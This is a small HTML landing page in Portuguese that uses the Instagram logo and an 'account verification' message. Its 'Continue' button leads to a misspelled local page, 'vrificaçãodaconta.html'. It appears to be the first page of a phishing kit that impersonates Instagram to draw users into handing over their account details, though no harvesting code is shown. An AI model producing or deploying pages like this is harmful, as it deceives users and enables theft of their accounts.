<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Página Inicial</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(120deg, #e41ea2, #8e44ad);
            overflow: hidden;
            font-family: Arial, sans-serif;
            color: white;
            text-align: center;
        }
        .container {
            opacity: 0;
            transform: translateY(-20px);
            animation: fadeIn 1.5s forwards;
        }
        @keyframes fadeIn {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
        }
        .btn {
            display: inline-block;
            padding: 15px 30px;
            background: #fff;
            color: #8e44ad;
            font-size: 1.2rem;
            font-weight: bold;
            border-radius: 50px;
            text-decoration: none;
            transition: transform 0.3s ease, background 0.3s ease;
        }
        .btn:hover {
            background: #f1c40f;
            transform: scale(1.1);
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
        <h1>Bem-vindo!</h1>
    <p></p>
        <p>Prepare-se para verificar sua conta do instagram com segurança.</p>
        <a href="vrificaçãodaconta.html" class="btn">Continuar</a>
    </div>
</body>
</html>
